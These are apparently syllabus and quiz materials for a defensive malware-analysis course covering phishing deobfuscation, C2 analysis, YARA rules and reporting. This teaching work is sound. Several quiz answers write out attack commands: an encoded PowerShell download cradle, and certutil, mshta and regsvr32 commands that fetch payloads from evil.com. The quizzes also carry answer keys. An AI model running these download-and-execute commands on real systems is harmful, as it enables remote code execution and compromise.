lecture_notes.demonstration: Analyze multi-stage phishing: extract VBA macro with olevba, decode Base64 PowerShell, deobfuscate download URL, capture second stage from FakeNet-NG, deobfuscate final payload, extract all IoCs.

review.value: Replace IEX with Write-Output before running. Prints decoded command instead of executing. Repeat for multi-layer encoding until final payload is revealed.
Auto_Open macros, Shell/WScript.Shell calls, PowerShell in strings, Chr() chains, URLDownloadToFile imports.
Replace dynamic execution calls with output/echo to reveal decoded code. Tools like box-js emulate WSH for automatic deobfuscation.
JavaScript constructs binary file from embedded data and triggers download. No malicious file crosses the network. Detect via Blob API monitoring in browser telemetry.

learning_objectives: Identify and analyze C2 protocols: HTTP, DNS, HTTPS, and custom protocols
Extract C2 addresses, encryption keys, and protocol structure from malware
Detect C2 traffic using network metadata and behavioral indicators
Map C2 techniques to MITRE ATT&CK for detection signatures
readings: Practical Malware Analysis, Ch. 14 (Networking)
MITRE ATT&CK: Command and Control (TA0011)
Mudge, Cobalt Strike Malleable C2 documentation

lecture_notes.introduction: C2 communication is the attacker's lifeline to compromised systems. Understanding C2 protocols is critical for extraction of IoCs and network defense. HTTP/HTTPS C2 is most common because web traffic is universally allowed. DNS C2 encodes data in query subdomains. Cobalt Strike is the most common C2 framework. Analysis involves capturing traffic, identifying patterns (beaconing), reverse engineering protocol structure, extracting encryption keys, and developing detection signatures.
key_concepts: Beaconing: periodic C2 check-in, interval typically 60-3600 seconds with jitter to avoid detection
HTTP C2: beacon as GET/POST, commands in response body, legitimate-looking URLs and user-agents
HTTPS C2: encrypted, certificate info may reveal C2 (self-signed, recently issued)
DNS C2: data encoded in subdomain labels and TXT records, bypasses firewalls allowing DNS
Domain fronting: traffic appears to connect to legitimate CDN but routes to attacker's server
Cobalt Strike: most common C2 framework, malleable profiles customize traffic appearance
C2 encryption: AES or XOR, key may be hardcoded (extractable) or derived from DH exchange
Network IoCs: IPs, domains, URL patterns, JA3 fingerprints, HTTP header patterns, certificate fingerprints
Domain Generation Algorithms: pseudo-random domain names generated daily, detected by high-entropy NXDOMAIN queries
lecture_notes.demonstration: Analyze C2 communication: run sample with FakeNet-NG, identify beaconing pattern, capture encrypted request body, reverse engineer encryption in Ghidra (XOR with 16-byte key in .data), decrypt captured traffic revealing beacon data and tasking commands. Extract all IoCs.
setup_requirements: Ghidra for C2 protocol reverse engineering

review.value: Calculate inter-connection time standard deviation per destination. Low StdDev relative to interval = beaconing. Normal traffic has high variance.
Default JA3 fingerprint, default certificate (Major Cobalt Strike), default URL patterns. Custom profiles change these but operators often miss some defaults.
DNS queries carry approximately 200 bytes in subdomains. At 10 queries/second that is roughly 2KB/s. Sufficient for C2 commands but too slow for bulk exfiltration.
Monitor for NXDOMAIN responses to high-entropy domains. DGA domains have distinctive statistical properties (high entropy, unusual length distribution).

learning_objectives: Write YARA rules for malware detection, classification, and threat hunting
Develop signatures from analysis findings: unique strings, byte patterns, behavioral indicators
Test YARA rules against clean file corpora to minimize false positives
Integrate YARA rules into scanning pipelines
readings: YARA documentation: Writing YARA rules
VirusTotal Hunting: YARA rule deployment
Elastic, YARA Signature Development Best Practices

lecture_notes.introduction: YARA is the standard pattern-matching language for malware detection and classification. Rules combine text strings, hex byte patterns, regular expressions, PE module features, and file characteristics into detection conditions. The art is selecting patterns specific enough to avoid false positives but general enough to catch variants. YARA rules are the primary output of malware analysis: they translate findings into automated detection deployable across security infrastructure.
key_concepts: Rule structure: rule name { meta: strings: condition: }
Text strings: exact match with nocase/wide/ascii modifiers
Hex strings: byte patterns with ?? wildcards for unknown bytes
Hex jumps: variable-length gaps between pattern fragments [4-8]
Regular expressions: match patterns across variants
PE module: pe.imports(), pe.sections[].entropy for PE-specific conditions
Condition operators: any of, N of, filesize constraints, uint16(0) == 0x5A4D for PE check
False positive testing: scan against clean file corpus before deployment
Deployment: local scanning, VirusTotal Hunting retrohunt, SIEM/EDR integration
lecture_notes.demonstration: Write YARA rules from analysis findings: rule for ransomware (mutex, ransom note pattern, extension), rule for C2 protocol (XOR key bytes, beacon URL, user-agent), generic process injection rule (API imports + PE characteristics). Test all against clean corpus and malware samples.
setup_requirements: Malware sample collection for true positive testing
Clean file corpus for false positive testing

review.value: A rule matching one API name alone hits many legitimate programs. Add specificity: require the API PLUS a suspicious string PLUS unusual PE characteristics. Each condition reduces false positives.
Extract bytes from Ghidra for unique code patterns. Use ?? wildcards for register-dependent operands that vary per build.
Malware evolves. Monitor rule performance. Increasing false negatives signal pattern shifts. Update rules when new variants are analyzed.
Prefer hex strings over regex. Limit condition complexity. Use filesize constraints to skip non-target files early. Well-optimized rules scan at roughly 100MB/s.

learning_objectives: Write a professional malware analysis report with all required sections
Extract and format IoCs for sharing via STIX/TAXII
Map all findings to MITRE ATT&CK with evidence references
Present findings and defend methodology to a technical audience
readings: SANS, Writing Malware Analysis Reports guide
STIX 2.1 specification overview
MITRE ATT&CK mapping best practices

lecture_notes.introduction: The value of malware analysis is realized through clear, actionable reporting and intelligence sharing. A professional report must communicate to multiple audiences: executives need threat severity and business impact, SOC analysts need detection signatures and IoCs, incident responders need behavioral indicators, and threat intelligence teams need ATT&CK mapping. The standard structure covers executive summary, static/dynamic/code analysis, IoCs, ATT&CK mapping, and detection recommendations. IoCs formatted in STIX enable automated sharing via TAXII. This capstone session covers report writing and presents the final analysis synthesizing all course skills.
key_concepts: Report structure: executive summary, malware overview, static analysis, dynamic analysis, code analysis, IoCs, ATT&CK mapping, detection recommendations
Executive summary: 1 paragraph with malware type, severity, capabilities, immediate actions for non-technical stakeholders
Evidence standards: every claim supported by screenshot, log excerpt, or code reference; reproducible steps
IoC formatting: file hashes, network indicators (IPs, domains, URLs), host indicators (paths, registry keys, mutexes)
STIX 2.1: standardized threat intelligence objects in JSON (malware, indicator, attack-pattern, relationship)
TAXII: transport protocol for sharing STIX objects between organizations
MITRE ATT&CK mapping: technique ID, name, and evidence reference for each observed behavior
Detection recommendations: YARA rules, Snort/Suricata rules, SIEM correlation rules
Report audience: executive summary for management, details for analysts, IoCs for automation, YARA for detection engineering
lecture_notes.demonstration: Present a complete analysis report for the capstone sample. Walk through each section with evidence. Demonstrate STIX-formatted output and discuss TAXII sharing. Peer review and methodology defense.
setup_requirements: STIX editor or Python stix2 library

review.value: Actionable (IoCs ready for deployment), evidence-based (every claim has proof), reproducible (another analyst reaches same conclusions), multi-audience (executive, analyst, automation), shareable (STIX-formatted IoCs).
Connects the sample to the broader threat landscape. Defenders can search for techniques across all telemetry, not just this sample's IoCs.
File hashes change per build (days). Domains/IPs rotate (days to weeks). Behavioral indicators persist (months). YARA rules based on code patterns have the longest useful life.
Bundles contain malware, indicator, attack-pattern, and relationship objects. Automated ingestion by SIEM, EDR, and firewall systems across participating organizations.

questions.question: You are analyzing a suspicious executable. PEStudio shows imports: CreateToolhelp32Snapshot, Process32First, OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread. The .text section entropy is 7.8. What is the likely capability, and what does the entropy mean for your analysis approach?
questions.answer: The import chain reveals classic process injection (DLL injection): CreateToolhelp32Snapshot + Process32First enumerate processes, OpenProcess opens a target, VirtualAllocEx allocates memory in the target, WriteProcessMemory writes malicious code, CreateRemoteThread executes it. The entropy of 7.8 indicates the code is packed or encrypted. The visible imports are from an unpacking stub; the actual payload imports are hidden. The analyst must unpack (identify packer with DIE, unpack appropriately) or use dynamic analysis/debugging to capture the unpacked payload from memory.

rubric.key: Correctly identifies process injection from import chain
Explains each API's role in the injection sequence
Correctly interprets high entropy and its analysis implications

questions.question: During dynamic analysis, ProcMon shows: (1) CreateFile to AppData\Roaming\svchost.exe, (2) RegSetValue to HKCU\...\Run with value pointing to svchost.exe, (3) TCP Connect to 185.220.101.45:443. Interpret each behavior, provide the ATT&CK technique ID, and list IoCs to extract.
questions.answer: (1) File drop mimicking legitimate process name (T1036.005 Masquerading). (2) Registry Run key persistence (T1547.001 Registry Run Keys). (3) HTTPS C2 communication (T1071.001 Application Layer Protocol: Web). IoCs: file hash of svchost.exe, path AppData\Roaming\svchost.exe, registry key HKCU\...\Run\WindowsUpdate, IP 185.220.101.45, port 443, any resolved domain from DNS logs.

rubric.key: Correct interpretation of all three behaviors

questions.question: A malware sample creates mutex 'Global\MutexRAT2024v3'. Explain the purpose, why it is a valuable IoC, and how to detect it across an enterprise.
questions.answer: Purpose: prevents multiple instances from running (single-instance enforcement). IoC value: mutex names are unique to malware families, persist across recompilations, and are present in memory on every infected machine. More persistent than hashes which change per build. Detection: YARA rule matching the string, Sysmon logging of named mutex creation, SIEM rule alerting on this mutex name, Volatility mutantscan for memory forensics during incident response.

rubric.key: Explains why mutex names are valuable persistent IoCs

questions.question: In Ghidra's decompiler, you see a function that reads 256 bytes from a PE resource, XORs each byte with 0x5A, calls InternetOpenUrlA with the result, reads the response into a buffer passed to CreateThread. Explain the behavior and provide steps to extract the C2 URL.
questions.answer: The malware stores its C2 URL XOR-encrypted (key 0x5A) in a PE resource. At runtime: loads resource, XOR-decodes to plaintext URL, downloads second-stage payload via InternetOpenUrlA, executes downloaded code in a new thread (download-and-execute). To extract: (1) Use Resource Hacker to dump the 256-byte resource. (2) Python: decoded = bytes([b ^ 0x5A for b in resource_data]). (3) Result is the C2 URL. Alternative: break on InternetOpenUrlA in x64dbg and read the URL parameter.

questions.question: A malware sample exits cleanly after 2 seconds in your VM without malicious activity. Name three anti-analysis checks to investigate and how to bypass each.
questions.answer: Check 1: VM detection (registry keys, CPUID, MAC OUI, VM processes). Bypass: ScyllaHide, remove VMware Tools, change MAC, add realistic user files. Check 2: Sleep/timing evasion (Sleep(120000) exceeding sandbox timeout). Bypass: break on Sleep in x64dbg, change argument to 1ms. Check 3: Anti-debugging (IsDebuggerPresent, NtQueryInformationProcess, timing comparison). Bypass: ScyllaHide anti-anti-debug, manually set PEB.BeingDebugged to 0, patch conditional jumps.

questions.question: When would you use a hardware breakpoint instead of a software breakpoint during malware debugging? Explain the technical difference.
questions.answer: Software breakpoints write INT3 (0xCC) over the target instruction, modifying code in memory. Detectable by anti-debugging that checksums code sections. Limited to execute only. Hardware breakpoints use CPU debug registers (DR0-DR3), do not modify memory, invisible to integrity checks. Limited to 4 simultaneous breakpoints but support read/write/execute triggers. Use hardware breakpoints when: malware checksums its own code, you need memory access breakpoints (break on data read/write), or in self-modifying code where software breakpoints get overwritten.

rubric.key: Correct technical explanation of both types

questions.question: Explain the BYOVD technique, why it bypasses driver signing, and how to detect it.
questions.answer: BYOVD uses a legitimately signed but vulnerable kernel driver. The attacker loads it (passes signing verification), exploits the vulnerability (e.g., arbitrary kernel write via IOCTL) to disable security features or load unsigned rootkit code. Detection: check loaded drivers against LOLDrivers database, monitor Sysmon Event ID 6 for driver loads from unusual paths, watch for IOCTL calls to drivers with known vulnerable IOCTLs.

rubric.key: Correctly explains BYOVD and signing bypass

questions.question: Volatility pslist shows 45 processes but psscan finds 47. What does this indicate and what additional plugins would you use?
questions.answer: DKOM: 2 processes unlinked from ActiveProcessLinks. pslist walks the linked list (OS view, 45). psscan scans raw memory for EPROCESS structures (47). Additional plugins: psxview (cross-reference methods), ssdt (hooked system calls), callbacks (notification callbacks), malfind (injected executable code), netscan (hidden network connections), driverirp (filter driver hooks), modscan vs modules (hidden kernel modules).

rubric.key: At least 4 relevant plugins with purpose

questions.question: Why is VMProtect-protected malware much harder to analyze than UPX-packed malware?
questions.answer: UPX compresses code; the unpacking stub decompresses the original instructions intact. Unpacking is trivial (upx -d or breakpoint-and-dump). VMProtect converts x86 instructions into bytecode for a custom virtual machine. Original instructions are permanently destroyed. Reversing requires understanding the VM dispatcher, handler semantics, and bytecode encoding -- exponentially harder. For VMProtect, behavioral analysis (API breakpoints, dynamic monitoring) is often more practical than full code reversal.

rubric.key: Explains why VM protection is fundamentally harder

questions.question: A ransomware sample uses CryptGenRandom for AES-256 keys. Explain why recovery is impossible. Then contrast with a sample seeding rand() with GetTickCount() and describe how to attempt recovery.
questions.answer: CryptGenRandom draws from hardware entropy; each key is truly random with 2^256 possible values, unbrute-forceable. With GetTickCount() + rand(): GetTickCount is 32-bit (~4.3 billion values). Determine approximate infection time from logs, calculate tick range, for each candidate seed call srand() and generate the same key sequence, try decrypting a file with known content. Brute-forcing ~346 million seeds is feasible in minutes on modern hardware.

rubric.key: Practical recovery approach for weak RNG

questions.question: Deobfuscate this PowerShell: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1AC8AcwAuAHAAcwAxACcAKQA=
questions.answer: Base64 decode (UTF-16LE): IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/s.ps1'). This is a download cradle: IEX executes the script downloaded into memory without writing to disk. ATT&CK: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer). IoCs: IP 192.168.1.5, path /s.ps1. Internal IP suggests lateral movement or compromised internal host.

rubric.key: Provides IoCs and fileless execution note

questions.question: Name three LOLBins with specific attack commands and detection strategies.
questions.answer: (1) certutil.exe: certutil -urlcache -split -f http://evil.com/payload.exe C:\Users\Public\payload.exe. Detect: Sysmon Event ID 1 for certutil with -urlcache. (2) mshta.exe: mshta http://evil.com/attack.hta. Detect: mshta with URL argument. (3) regsvr32.exe: regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll. Detect: regsvr32 with /i: containing URL and scrobj.dll target.

rubric.key: Three valid LOLBins with correct commands

questions.question: Write a YARA rule detecting a malware family with: string 'MutexRAT2024' (case-insensitive), hex pattern { 8A 06 34 ?? 88 06 46 E2 F8 } for XOR loop, PE executable under 500KB.
questions.answer:
rule MutexRAT_Family {
    meta:
        author = "Student"
        description = "Detects MutexRAT via mutex, XOR loop, PE characteristics"
    strings:
        $mutex = "MutexRAT2024" nocase
        $xor_loop = { 8A 06 34 ?? 88 06 46 E2 F8 }
    condition:
        uint16(0) == 0x5A4D and filesize < 500KB and $mutex and $xor_loop
}
The ?? wildcard matches any XOR key byte, catching all variants.

rubric.key: Correct YARA syntax with meta, strings, condition
Proper PE check, filesize, nocase, hex wildcards
Correct logical combination of all criteria

questions.question: How would you detect Cobalt Strike beaconing without decrypting HTTPS? Name three network metadata indicators.
questions.answer: (1) JA3 fingerprint: Cobalt Strike's Java TLS client has a distinctive hash differing from standard browsers, extracted from unencrypted ClientHello. (2) Beaconing timing: regular intervals (default 60s with jitter), low standard deviation vs legitimate traffic's high variance. (3) TLS certificate: self-signed, distinctive subject/serial patterns, recently issued, not in CT logs. Even with custom certs, JA3 and timing still apply.

rubric.key: Explains why each indicates Cobalt Strike

questions.question: What are the five essential sections of a professional malware analysis report? Why is the executive summary most important despite being shortest?
questions.answer: (1) Executive Summary: type, severity, capabilities, actions for non-technical stakeholders. (2) Static Analysis: PE structure, imports, strings, entropy, packing. (3) Dynamic Analysis: behavioral observations with evidence. (4) IoCs: hashes, network indicators, host artifacts. (5) ATT&CK Mapping: technique IDs with evidence. The executive summary is most important because it is the only section read by every stakeholder. If it does not communicate severity and actions, the rest may never be read.

rubric.key: Five sections correctly named with content

major_assignments.title: Comprehensive Malware Analysis Report
major_assignments.description: Perform complete analysis of an unknown malware sample using static, dynamic, and code analysis. Produce a professional report with IoCs, ATT&CK mapping, YARA rule, and network signature.
objectives: Apply static analysis for PE structure, imports, strings, and capabilities assessment
Execute dynamic analysis capturing file, registry, process, and network activity
Reverse engineer key functions: encryption, C2 protocol, persistence mechanisms
Write tested detection signatures (YARA and Snort/Suricata)
deliverables: Complete analysis report (10-15 pages) with standard structure
IoC table formatted for machine consumption
ATT&CK mapping with technique IDs and evidence
YARA rule tested against clean corpus and malware
Network detection signature for C2 traffic

criteria: PE header analysis with timestamp, entry point, sections
Packing identified and unpacked if applicable
File, registry, process, and network activity captured
Network IoCs extracted from captured traffic
Key functions identified and renamed in Ghidra
C2 protocol documented with encryption details
YARA rule with 3+ conditions, 0 false positives on clean corpus
Professional report quality with executive summary
Static analysis (30 pts), Dynamic analysis (35 pts), Code analysis (35 pts), Detection and reporting (50 pts)

major_assignments.title: Fileless Attack Chain Analysis Portfolio
major_assignments.description: Analyze a multi-stage fileless attack from phishing document through persistent access. Deobfuscate VBA, PowerShell, and .NET stages. Produce detection playbook for each stage.
objectives: Extract and deobfuscate VBA macros from malicious Office document
Deobfuscate multi-layer PowerShell to reveal download and execution logic
Decompile .NET payload analyzing credential theft and C2 capabilities
Document complete attack chain with detection opportunities at each stage
deliverables: VBA macro analysis with deobfuscated code and execution flow
PowerShell deobfuscation walkthrough showing each layer removed
.NET payload analysis with dnSpy showing functions, C2, credential theft
Attack chain timeline with ATT&CK mapping
Detection playbook: Sysmon, PowerShell, and SIEM rules per stage

criteria: Macro extracted with auto-execution triggers identified
Obfuscated strings decoded to reveal functionality
Command execution chain traced to PowerShell
Each obfuscation layer documented and removed
Final payload extracted with download URL and execution method
Payload decompiled with key functions identified
Detection rule for each attack stage
Sysmon and PowerShell logging configuration recommendations
VBA analysis (30 pts), PowerShell deobfuscation (35 pts), .NET and persistence (40 pts), Detection and timeline (45 pts)

major_assignments.title: Advanced Malware Independent Analysis Capstone
major_assignments.description: Independently analyze an advanced sample with anti-analysis techniques, encrypted C2, and sophisticated persistence. Tests all course skills without guided instructions.
objectives: Independently triage, analyze, and report on unknown advanced malware
Bypass anti-analysis protections to reach core malicious functionality
Extract and decrypt C2 configuration producing actionable IoCs
Write YARA rules and present findings in professional report
deliverables: Decrypted C2 configuration with all IoCs
YARA rule tested against clean corpus

criteria: All anti-analysis techniques identified with evidence
Unpacking performed if needed with validated dump
Capabilities documented through all analysis types
YARA rule detects sample and variants with 0 false positives
Network or behavioral detection signature provided
Executive summary communicates severity and actions
Anti-analysis bypass (25 pts), Core analysis (35 pts), Detection and sharing (25 pts), Report quality (15 pts)

weekly_quizzes.description: Five quizzes (weeks 3, 5, 8, 11, 14) testing malware analysis concepts, tools, and techniques

lab_assignments.description: Weekly hands-on malware analysis labs with guided and independent samples

major_assignments.description: Three projects: comprehensive report, fileless attack analysis, and independent advanced sample

midterm_examination.description: Practical exam: timed analysis of a malware sample with report deliverable

final_project.description: Independent analysis capstone of an advanced malware sample with anti-analysis techniques

course_policies.attendance: Attendance is mandatory for all lab sessions. More than 2 unexcused absences may result in course failure.
course_policies.late_submissions: Late assignments penalized 10% per day for up to 5 days. One 48-hour extension per student per semester.
course_policies.collaboration: All analysis must be individual work. Sharing IoCs or findings before submission is prohibited. Discussion of techniques and tools is encouraged.
course_policies.academic_integrity: Samples must only be analyzed in the isolated lab environment. Removing samples from lab or executing on non-lab systems is grounds for expulsion.
course_policies.technology_requirements: Lab computers with FlareVM, REMnux, Ghidra, x64dbg provided. Personal machines need isolated VMs with host-only networking, 16GB RAM minimum. Never connect the analysis VM to the internet.
